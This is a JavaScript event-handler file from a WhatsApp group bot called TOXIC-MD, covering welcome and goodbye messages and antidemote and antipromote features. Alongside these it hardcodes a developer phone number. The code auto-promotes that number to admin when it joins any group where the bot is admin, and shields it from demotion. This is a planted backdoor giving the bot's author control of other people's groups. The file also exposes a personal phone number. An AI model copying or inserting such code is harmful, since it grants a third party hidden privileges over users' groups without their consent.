import { getGroupSettings, getSudoUsers, resetWarn } from '../database/config.js';
import antiforeign from '../features/antiforeign.js';
import { resolveTargetJid } from '../lib/lidResolver.js';

const DEVELOPER_NUMBER = "254114885159";

const _num = (jid) => (jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');

const normalizeJid = (jid) => {
    if (!jid) return '';
    if (jid.endsWith('@lid') && globalThis.resolvePhoneFromLid) {
        const phone = globalThis.resolvePhoneFromLid(jid);
        if (phone) return phone + '@s.whatsapp.net';
    }
    return _num(jid) + '@s.whatsapp.net';
};

const isDeveloper = (jid) => _num(jid) === DEVELOPER_NUMBER;

const Events = async (client, event, pict) => {
    const botJid = normalizeJid(client.decodeJid(client.user.id));

    // Fetch metadata independently — a failure here must NOT abort welcome/goodbye/etc.
    let metadata = null;
    try {
        metadata = await client.groupMetadata(event.id);
    } catch (e) {
        console.log(`[EVENTS] groupMetadata fetch failed for ${event.id}:`, e.message);
    }
    if (!metadata) metadata = { subject: event.id, desc: '', participants: [], owner: '' };

    const participants = event.participants || [];
    const desc = metadata.desc || "Some boring group, I guess.";

    let groupSettings = {};
    try {
        groupSettings = await getGroupSettings(event.id);
    } catch (e) {
        console.log(`[EVENTS] getGroupSettings failed for ${event.id}:`, e.message);
    }

    const welcomeEnabled = groupSettings?.welcome === true || groupSettings?.welcome === 1;
    const goodbyeEnabled = groupSettings?.goodbye === true || groupSettings?.goodbye === 1;
    const antidemote = groupSettings?.antidemote === true || groupSettings?.antidemote === 1;
    const antipromote = groupSettings?.antipromote === true || groupSettings?.antipromote === 1;

    console.log(`[EVENTS] action=${event.action} group=${event.id} participants=${JSON.stringify(participants)} welcome=${welcomeEnabled} goodbye=${goodbyeEnabled} antidemote=${antidemote} antipromote=${antipromote}`);

    let sudoUsers = [];
    try { sudoUsers = await getSudoUsers(); } catch {}
    const currentDevs = Array.isArray(sudoUsers) ? sudoUsers.map(v => normalizeJid(v)) : [];
    currentDevs.push(normalizeJid(DEVELOPER_NUMBER));

    const isProtected = (jid) => {
        const n = normalizeJid(jid);
        return isDeveloper(jid) || currentDevs.includes(n) || n === botJid || n === normalizeJid(metadata.owner);
    };

    const dpUrls = await Promise.all(
        participants.map(async (participant) => {
            try { return await client.profilePictureUrl(participant, "image"); } catch { return pict || null; }
        })
    );

    // Auto-promote developer + antiforeign on join
    if (event.action === "add") {
        try { await antiforeign(client, event); } catch (e) {
            console.log('[EVENTS] antiforeign error:', e.message);
        }
        for (const participant of participants) {
            if (isDeveloper(participant)) {
                try {
                    const freshMeta = await client.groupMetadata(event.id);
                    const botIsAdmin = freshMeta.participants.some(
                        p => normalizeJid(p.id || p.jid || '') === botJid && p.admin !== null
                    );
                    if (botIsAdmin) {
                        const devJid = normalizeJid(participant);
                        await client.groupParticipantsUpdate(event.id, [devJid], "promote");
                        await client.sendMessage(event.id, {
                            text: `╭───(    TOXIC-MD    )───\n├───≫ AUTO-PROMOTED ≪───\n├ \n├ 👑 The developer has joined.\n├ Auto-promoted to admin.\n╰──────────────────☉\n> ©𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                            mentions: [devJid]
                        });
                    }
                } catch (e) {
                    console.log('[EVENTS] dev auto-promote error:', e.message);
                }
            }
        }
    }

    // Welcome
    if (welcomeEnabled && event.action === "add") {
        console.log(`[EVENTS] Sending welcome to ${participants.length} member(s) in ${event.id}`);
        for (let i = 0; i < participants.length; i++) {
            const participant = participants[i];
            const userName = participant.split("@")[0].split(":")[0];
            const dpUrl = dpUrls[i];
            const caption =
`╭───(    TOXIC-MD    )───
├───≫ WELCOME ≪───
├ 
├ 😈 *Yo, @${userName}, welcome to the chaos!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Desc*: ${desc}
├ 
├ 😼 *Try not to get roasted too hard, newbie!*
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
            try {
                if (dpUrl) {
                    await client.sendMessage(event.id, { image: { url: dpUrl }, caption, mentions: [participant] });
                } else {
                    await client.sendMessage(event.id, { text: caption, mentions: [participant] });
                }
            } catch (e) {
                console.log('[EVENTS] Welcome image send failed, retrying text:', e.message);
                try { await client.sendMessage(event.id, { text: caption, mentions: [participant] }); } catch (e2) {
                    console.log('[EVENTS] Welcome text send also failed:', e2.message);
                }
            }
        }
    }

    // Reset warns on leave
    if (event.action === "remove") {
        for (const participant of participants) {
            try { await resetWarn(event.id, normalizeJid(participant)); } catch {}
        }
    }

    // Goodbye
    if (goodbyeEnabled && event.action === "remove") {
        console.log(`[EVENTS] Sending goodbye to ${participants.length} member(s) in ${event.id}`);
        for (let i = 0; i < participants.length; i++) {
            const participant = participants[i];
            const userName = participant.split("@")[0].split(":")[0];
            const dpUrl = dpUrls[i];
            const caption =
`╭───(    TOXIC-MD    )───
├───≫ GOODBYE ≪───
├ 
├ 😎 *Later, @${userName}! Couldn't handle the heat?*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 
├ 😜 *Don't cry, we'll survive without ya!*
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
            try {
                if (dpUrl) {
                    await client.sendMessage(event.id, { image: { url: dpUrl }, caption, mentions: [participant] });
                } else {
                    await client.sendMessage(event.id, { text: caption, mentions: [participant] });
                }
            } catch (e) {
                console.log('[EVENTS] Goodbye image send failed, retrying text:', e.message);
                try { await client.sendMessage(event.id, { text: caption, mentions: [participant] }); } catch (e2) {
                    console.log('[EVENTS] Goodbye text send also failed:', e2.message);
                }
            }
        }
    }

    // Antidemote — use resolveTargetJid for LID-safe JID resolution
    if (event.action === "demote" && antidemote) {
        console.log(`[EVENTS] Antidemote triggered — participant=${participants[0]} author=${event.author}`);
        try {
            const participant = participants[0];
            const nParticipant = resolveTargetJid(participant, metadata.participants) || normalizeJid(participant);
            const nAuthor = event.author
                ? (resolveTargetJid(event.author, metadata.participants) || normalizeJid(event.author))
                : null;

            if (isProtected(participant)) {
                try { await client.groupParticipantsUpdate(event.id, [nParticipant], "promote"); } catch {}
                await client.sendMessage(event.id, {
                    text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIDEMOTE ≪───
├ 
├ 🛡️ *@${participant.split("@")[0].split(":")[0]} cannot be demoted.*
├ Protected user — re-promoted automatically.
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                    mentions: [participant]
                });
                return;
            }

            if (isProtected(event.author)) return;

            if (nAuthor) await client.groupParticipantsUpdate(event.id, [nAuthor], "demote").catch(() => {});
            await client.groupParticipantsUpdate(event.id, [nParticipant], "promote").catch(() => {});
            await client.sendMessage(event.id, {
                text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIDEMOTE ≪───
├ 
├ 😏 *Nice try, @${(event.author || '').split("@")[0].split(":")[0]}! Demoted for messing with @${participant.split("@")[0].split(":")[0]}!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Rule*: Antidemote is on. Only the big dogs can demote!
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                mentions: [event.author, participant].filter(Boolean)
            });
        } catch (e) {
            console.log('[EVENTS] Antidemote error:', e.message);
        }
    } else if (event.action === "promote" && antipromote) {
        console.log(`[EVENTS] Antipromote triggered — participant=${participants[0]} author=${event.author}`);
        try {
            const participant = participants[0];
            const nParticipant = resolveTargetJid(participant, metadata.participants) || normalizeJid(participant);
            const nAuthor = event.author
                ? (resolveTargetJid(event.author, metadata.participants) || normalizeJid(event.author))
                : null;

            if (isProtected(event.author)) return;

            if (isProtected(participant)) {
                await client.sendMessage(event.id, {
                    text:
`╭───(    TOXIC-MD    )───
├───≫ PROMOTION ≪───
├ 
├ 😎 *Big dog @${participant.split("@")[0].split(":")[0]} just leveled up!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                    mentions: [participant]
                });
                return;
            }

            const toDemote = [nParticipant];
            if (nAuthor) toDemote.push(nAuthor);
            await client.groupParticipantsUpdate(event.id, toDemote, "demote").catch(() => {});
            await client.sendMessage(event.id, {
                text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIPROMOTE ≪───
├ 
├ 😆 *Oof, @${(event.author || '').split("@")[0].split(":")[0]}! Demoted for trying to boost @${participant.split("@")[0].split(":")[0]}!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Rule*: Antipromote is on. Only the elite can promote!
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                mentions: [event.author, participant].filter(Boolean)
            });
        } catch (e) {
            console.log('[EVENTS] Antipromote error:', e.message);
        }
    }
};

export default Events;
